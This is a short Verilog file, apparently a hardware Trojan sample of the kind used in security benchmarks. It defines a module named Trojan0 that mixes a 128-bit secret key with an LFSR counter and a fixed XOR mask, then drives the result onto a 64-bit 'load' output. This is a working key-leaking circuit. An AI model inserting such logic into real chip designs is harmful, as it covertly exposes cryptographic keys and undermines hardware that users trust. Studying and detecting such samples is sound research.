module Trojan0 #(
    parameter KEY_WIDTH = 128,
    parameter LOAD_WIDTH = 64,
    parameter LFSR_WIDTH = 20,
    parameter LOAD_XOR_MASK = 64'h8FADC1A6B5E37921
)(
    input wire clk,
    input wire rst,
    input wire [KEY_WIDTH-1:0] key,
    output reg [LOAD_WIDTH-1:0] load
);
	wire [LFSR_WIDTH-1:0] counter;
	lfsr_counter lfsr (rst, clk, counter);

	always @(posedge clk) begin
		integer i;
		for (i = 0; i < LOAD_WIDTH; i = i + 1) begin
		    if (i < KEY_WIDTH && (i/8) < LFSR_WIDTH) begin
		        load[i] <= key[i % KEY_WIDTH] ^ counter[i % LFSR_WIDTH] ^ LOAD_XOR_MASK[i % 64];
		    end else if (i < KEY_WIDTH) begin
		        load[i] <= key[i % KEY_WIDTH] ^ LOAD_XOR_MASK[i % 64];
		    end else begin
		        load[i] <= counter[i % LFSR_WIDTH] ^ LOAD_XOR_MASK[i % 64];
		    end
		end
	end

endmodule


module lfsr_counter #(
    parameter LFSR_WIDTH = 20,
    parameter FEEDBACK_POLY = 32'h9A1DE644,
    parameter INIT_VALUE = 20'b10011001100110011001
)(
	input rst, clk, 
	output [LFSR_WIDTH-1:0] lfsr
);

	reg [LFSR_WIDTH-1:0] lfsr_stream;
	wire feedback;
	
	assign lfsr = lfsr_stream; 
	
	// Generate feedback based on polynomial
	assign feedback = ^(lfsr_stream & FEEDBACK_POLY[LFSR_WIDTH-1:0]);

	always @(posedge clk)
		if (rst == 1) begin
			lfsr_stream <= INIT_VALUE[LFSR_WIDTH-1:0];
		end else begin
			lfsr_stream <= {feedback, lfsr_stream[LFSR_WIDTH-1:1]}; 
		end
		
endmodule